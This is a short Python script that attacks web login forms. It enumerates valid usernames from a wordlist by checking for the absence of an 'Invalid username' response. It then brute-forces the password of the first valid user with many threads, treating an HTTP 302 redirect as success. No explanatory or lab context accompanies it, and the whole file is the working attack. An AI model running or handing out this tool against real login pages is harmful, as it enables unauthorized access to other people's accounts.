import requests
import sys
import threading

if len(sys.argv) < 4:
    print("Usage: python script.py <url> <username_file> <password_file>")
    sys.exit()

else:
    user_url = sys.argv[1]
    username_file = sys.argv[2]
    password_file = sys.argv[3]
    usernames = []
    passwords = []

    with open(username_file) as f:
        usernames = [line.strip() for line in f if line.strip()]

    with open(password_file) as f:
        passwords = [line.strip() for line in f if line.strip()]
    user_url = user_url.strip()

    try:
        response = requests.get(user_url)
        if response.status_code == 200:
            print(f"user enterted url is {user_url}" + f"  status code is: {response.status_code}")
        else:
                print(f"The entered url is wrong {user_url}" + f"  status code is: {response.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"An error occurred. Make sure you entered a valid URL (including http:// or https://).\nError: {e}")

    valid_usernames = []
    lock = threading.Lock()

    def check_username(usernames):
     data = {"username": usernames, "password": "wrongpassword"}
     response = requests.post(user_url, data=data)
     if "Invalid username" not in response.text:
        with lock:
            valid_usernames.append(usernames)
            print(f"[+] Valid username found: {usernames}")


    def check_password(passwords):
        data = {"username": valid_usernames[0], "password": passwords}
        response = requests.post(user_url, data=data, allow_redirects=False)
        print(f"Testing password: {passwords} → {response.status_code}")
        if response.status_code == 302:
            with lock:
                print(f"[+] Valid password found: {passwords}")

    threads = []
    for username in usernames:
        t = threading.Thread(target=check_username, args=(username,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

    # Phase 2: brute force password
    threads = []
    for password in passwords:
        t = threading.Thread(target=check_password, args=(password,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

print(f"Usernames tested: {len(usernames)}")
print(f"Valid usernames found: {valid_usernames}")